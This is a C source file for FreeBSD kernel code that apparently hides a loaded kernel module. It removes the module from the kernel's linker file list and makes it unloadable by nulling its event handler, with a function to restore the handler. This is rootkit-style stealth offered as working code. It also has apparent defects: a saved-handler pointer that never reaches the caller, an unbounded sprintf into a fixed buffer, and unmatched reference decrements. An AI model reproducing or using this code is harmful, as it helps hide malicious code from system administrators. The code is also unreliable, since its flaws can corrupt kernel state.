/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include <freebsd/incantations.h>
#include <freebsd/externals.h>

static struct linker_file *find_kld(const char *name);

int native_icloak_ko(const char *name) {
    struct linker_file *kld;
    int deleted = 0;

    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    (&linker_files)->tqh_first->refs--;

    if ((kld = find_kld(name)) != NULL) {
        TAILQ_REMOVE(&linker_files, kld, link);
        next_file_id--;
        deleted = 1;
        kld = NULL;
    }

    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    return (deleted == 1) ? 0 : 1;
}

int native_icloak_mk_ko_perm(const char *name, void **exit) {
    struct module *mp = NULL;
    struct linker_file *kld;
    int error;

    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    (&linker_files)->tqh_first->refs--;

    if ((kld = find_kld(name)) != NULL) {
        mp = (struct module *)&kld->modules;
        kld = NULL;
    }

    if (mp != NULL) {
        if (exit != NULL) {
            exit = (void *)mp->handler;
        }
        mp->handler = NULL;
    }

    error = (mp != NULL && mp->handler == NULL) ? 0 : 1;

    mp = NULL;

    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    return error;
}

int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
    struct module *mp = NULL;
    int error;
    struct linker_file *kld;

    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    (&linker_files)->tqh_first->refs--;

    if ((kld = find_kld(name)) != NULL) {
        mp = (struct module *)&kld->modules;
        kld = NULL;
    }

    if (mp != NULL) {
        mp->handler = exit;
    }

    error = (mp != NULL && mp->handler == exit) ? 0 : 1;

    mp = NULL;

    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    return error;
}

static struct linker_file *find_kld(const char *name) {
    struct linker_file *lp;
    char name_ext[255];
    size_t name_size;

    if (name == NULL) {
        return NULL;
    }

    name_size = strlen(name);

    if (name_size < 3 || strcmp((name + name_size - 3), ".ko") != 0) {
        sprintf(name_ext, "%s.ko", name);
    } else {
        sprintf(name_ext, "%s", name);
    }

    TAILQ_FOREACH(lp, &linker_files, link) {
        if (strcmp(lp->filename, name_ext) == 0) {
            return lp;
        }
    }

    return NULL;
}
